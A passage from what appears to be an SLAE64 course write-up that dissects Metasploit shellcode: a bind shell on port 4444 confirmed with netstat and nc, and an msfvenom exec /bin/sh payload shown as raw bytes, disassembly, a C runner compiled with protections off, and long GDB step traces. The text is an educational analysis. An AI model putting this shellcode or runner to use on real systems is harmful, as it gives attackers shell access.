0056| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000006010b1 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x0 
RSI: 0x7fffffffe478 --> 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
RDI: 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe478 --> 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x6010b4 --> 0x50f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x6010af <code+79>:	push   rdx
   0x6010b0 <code+80>:	push   rdi
   0x6010b1 <code+81>:	mov    rsi,rsp
=> 0x6010b4 <code+84>:	syscall 
   0x6010b6 <code+86>:	add    BYTE PTR [rax],al
   0x6010b8:	add    BYTE PTR [rax],al
   0x6010ba:	add    BYTE PTR [rax],al
   0x6010bc:	add    BYTE PTR [rax],al
Guessed arguments:
arg[0]: 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
arg[1]: 0x7fffffffe478 --> 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe478 --> 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffe480 --> 0x0 
0016| 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
0024| 0x7fffffffe490 --> 0x5c110002 
0032| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0040| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0048| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0056| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000006010b4 in code ()
gdb-peda$ 
process 5610 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x40059a
```

The shellcode open a bind shell on default port 4444
```
$ netstat -tunap
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      5610/shellcode2 
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
$ nc -vv localhost 4444
Connection to localhost 4444 port [tcp/*] succeeded!
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
```

## Shellcode 3 Analysis

Shellcode Options:

```
root@kali:~# msfvenom -p linux/x64/exec --arch x64 --payload-options
Options for payload/linux/x64/exec:


       Name: Linux Execute Command
     Module: payload/linux/x64/exec
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 40
       Rank: Normal

Provided by:
    ricky

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command


Advanced options for payload/linux/x64/exec:

    Name                Current Setting  Required  Description
    ----                ---------------  --------  -----------
    AppendExit          false            no        Append a stub that executes the exit(0) system call
    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
    VERBOSE             false            no        Enable detailed status messages
    WORKSPACE                            no        Specify the workspace for this module
Evasion options for payload/linux/x64/exec:

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
```

Shellcode generation:

```
root@kali:~# msfvenom -p linux/x64/exec --arch x64 --platform linux -f c CMD=/bin/sh
No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes
Final size of c file: 224 bytes
unsigned char buf[] = 
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
"\x0f\x05";
```

Shellcode opcodes:

```
root@kali:~# echo -ne "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05"| ndisasm -u -
00000000  6A3B              push byte +0x3b
00000002  58                pop eax
00000003  99                cdq
00000004  48                dec eax
00000005  BB2F62696E        mov ebx,0x6e69622f
0000000A  2F                das
0000000B  7368              jnc 0x75
0000000D  005348            add [ebx+0x48],dl
00000010  89E7              mov edi,esp
00000012  682D630000        push dword 0x632d
00000017  48                dec eax
00000018  89E6              mov esi,esp
0000001A  52                push edx
0000001B  E808000000        call 0x28
00000020  2F                das
00000021  62696E            bound ebp,[ecx+0x6e]
00000024  2F                das
00000025  7368              jnc 0x8f
00000027  005657            add [esi+0x57],dl
0000002A  48                dec eax
0000002B  89E6              mov esi,esp
0000002D  0F05              syscall
```

The shellcode calls execve with the /bin/sh argument.
Let's create a skeleton program:

```
// Filename: shellcode3.c
// Author:  SLAE64 - 1525
//
// Shellcode: msfvenom -p linux/x64/exec --arch x64 --platform linux -f c CMD=/bin/sh

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
"\x0f\x05";
void main()
{
    printf("Shellcode Length: %d\n", (int) strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

// Compile with:
// gcc -fno-stack-protector -z execstack shellcode3.c -o shellcode3
```

And compile it:

```
$ gcc -fno-stack-protector -z execstack shellcode3.c -o shellcode3
```

Full GDB dump with comments:

```
$ gdb -q ./shellcode3
Reading symbols from ./shellcode3...(no debugging symbols found)...done.
gdb-peda$ break *0x000000000040059a
Breakpoint 1 at 0x40059a
gdb-peda$ r
Starting program: /src/src/Assignment 5/shellcode3 
Shellcode Length:  13



















































[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0x622fbb4899583b6a 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
RIP: 0x40059a (<main+52>:	call   rdx)
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400589 <main+35>:	mov    QWORD PTR [rbp-0x8],0x601060
   0x400591 <main+43>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x400595 <main+47>:	mov    eax,0x0
=> 0x40059a <main+52>:	call   rdx
   0x40059c <main+54>:	nop
   0x40059d <main+55>:	leave  
   0x40059e <main+56>:	ret    
   0x40059f:	nop
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0008| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0016| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0024| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0032| 0x7fffffffe4c0 --> 0x0 
0040| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode3")
0048| 0x7fffffffe4d0 --> 0x100000000 
0056| 0x7fffffffe4d8 --> 0x400566 (<main>:	push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040059a in main ()
gdb-peda$ s















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0x622fbb4899583b6a 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x601060 --> 0x622fbb4899583b6a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105a:	add    BYTE PTR [rax],al
   0x60105c:	add    BYTE PTR [rax],al
   0x60105e:	add    BYTE PTR [rax],al
=> 0x601060 <code>:	push   0x3b
   0x601062 <code+2>:	pop    rax
   0x601063 <code+3>:	cdq    
   0x601064 <code+4>:	movabs rbx,0x68732f6e69622f
   0x60106e <code+14>:	push   rbx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode3")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601060 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0x622fbb4899583b6a 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x3b (';')
RIP: 0x601062 --> 0x6e69622fbb489958 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105b:	add    BYTE PTR [rax],al
   0x60105d:	add    BYTE PTR [rax],al
   0x60105f:	add    BYTE PTR [rdx+0x3b],ch
=> 0x601062 <code+2>:	pop    rax
   0x601063 <code+3>:	cdq    
   0x601064 <code+4>:	movabs rbx,0x68732f6e69622f
   0x60106e <code+14>:	push   rbx
   0x60106f <code+15>:	mov    rdi,rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x3b (';')
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode3")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601062 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0x622fbb4899583b6a 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x601063 --> 0x2f6e69622fbb4899 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105d:	add    BYTE PTR [rax],al
   0x60105f:	add    BYTE PTR [rdx+0x3b],ch
   0x601062 <code+2>:	pop    rax
=> 0x601063 <code+3>:	cdq    
   0x601064 <code+4>:	movabs rbx,0x68732f6e69622f
   0x60106e <code+14>:	push   rbx
   0x60106f <code+15>:	mov    rdi,rsp
   0x601072 <code+18>:	push   0x632d
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode3")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601063 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x601064 --> 0x732f6e69622fbb48 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105f:	add    BYTE PTR [rdx+0x3b],ch
   0x601062 <code+2>:	pop    rax
   0x601063 <code+3>:	cdq    
=> 0x601064 <code+4>:	movabs rbx,0x68732f6e69622f
   0x60106e <code+14>:	push   rbx
   0x60106f <code+15>:	mov    rdi,rsp
   0x601072 <code+18>:	push   0x632d
   0x601077 <code+23>:	mov    rsi,rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode3")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601064 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x60106e --> 0x632d68e7894853 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601062 <code+2>:	pop    rax
   0x601063 <code+3>:	cdq    
   0x601064 <code+4>:	movabs rbx,0x68732f6e69622f
=> 0x60106e <code+14>:	push   rbx
   0x60106f <code+15>:	mov    rdi,rsp
   0x601072 <code+18>:	push   0x632d
   0x601077 <code+23>:	mov    rsi,rsp
   0x60107a <code+26>:	push   rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode3")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060106e in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x60106f --> 0x632d68e78948 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601063 <code+3>:	cdq    
   0x601064 <code+4>:	movabs rbx,0x68732f6e69622f
   0x60106e <code+14>:	push   rbx
=> 0x60106f <code+15>:	mov    rdi,rsp
   0x601072 <code+18>:	push   0x632d
   0x601077 <code+23>:	mov    rsi,rsp
   0x60107a <code+26>:	push   rdx
   0x60107b <code+27>:	call   0x601088 <code+40>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode3")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060106f in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x601072 --> 0xe689480000632d68 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601064 <code+4>:	movabs rbx,0x68732f6e69622f
   0x60106e <code+14>:	push   rbx
   0x60106f <code+15>:	mov    rdi,rsp
=> 0x601072 <code+18>:	push   0x632d
   0x601077 <code+23>:	mov    rsi,rsp
   0x60107a <code+26>:	push   rdx
   0x60107b <code+27>:	call   0x601088 <code+40>
   0x601080 <code+32>:	(bad)
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode3")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601072 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x632d ('-c')
RIP: 0x601077 --> 0x8e852e68948 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60106e <code+14>:	push   rbx
   0x60106f <code+15>:	mov    rdi,rsp
   0x601072 <code+18>:	push   0x632d
=> 0x601077 <code+23>:	mov    rsi,rsp
   0x60107a <code+26>:	push   rdx
   0x60107b <code+27>:	call   0x601088 <code+40>
   0x601080 <code+32>:	(bad)  
   0x601081 <code+33>:	(bad)
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x632d ('-c')
0008| 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601077 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x7fffffffe488 --> 0x632d ('-c')
RDI: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x632d ('-c')
RIP: 0x60107a --> 0x622f00000008e852 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60106f <code+15>:	mov    rdi,rsp
   0x601072 <code+18>:	push   0x632d
   0x601077 <code+23>:	mov    rsi,rsp
=> 0x60107a <code+26>:	push   rdx
   0x60107b <code+27>:	call   0x601088 <code+40>
   0x601080 <code+32>:	(bad)  
   0x601081 <code+33>:	(bad)  
   0x601082 <code+34>:	imul   ebp,DWORD PTR [rsi+0x2f],0x56006873
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x632d ('-c')
0008| 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107a in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x7fffffffe488 --> 0x632d ('-c')
RDI: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe480 --> 0x0 
RIP: 0x60107b --> 0x69622f00000008e8 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601072 <code+18>:	push   0x632d
   0x601077 <code+23>:	mov    rsi,rsp
   0x60107a <code+26>:	push   rdx
=> 0x60107b <code+27>:	call   0x601088 <code+40>
   0x601080 <code+32>:	(bad)  
   0x601081 <code+33>:	(bad)  
   0x601082 <code+34>:	imul   ebp,DWORD PTR [rsi+0x2f],0x56006873
   0x601089 <code+41>:	push   rdi
Guessed arguments:
arg[0]: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
arg[1]: 0x7fffffffe488 --> 0x632d ('-c')
arg[2]: 0x0 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe480 --> 0x0 
0008| 0x7fffffffe488 --> 0x632d ('-c')
0016| 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0024| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0032| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0040| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0048| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0056| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107b in code ()
gdb-peda$ 













[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x7fffffffe488 --> 0x632d ('-c')
RDI: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe478 --> 0x601080 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x601088 --> 0x50fe689485756 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x601088 <code+40>:	push   rsi
   0x601089 <code+41>:	push   rdi
   0x60108a <code+42>:	mov    rsi,rsp
   0x60108d <code+45>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe478 --> 0x601080 --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffe480 --> 0x0 
0016| 0x7fffffffe488 --> 0x632d ('-c')
0024| 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0032| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0040| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
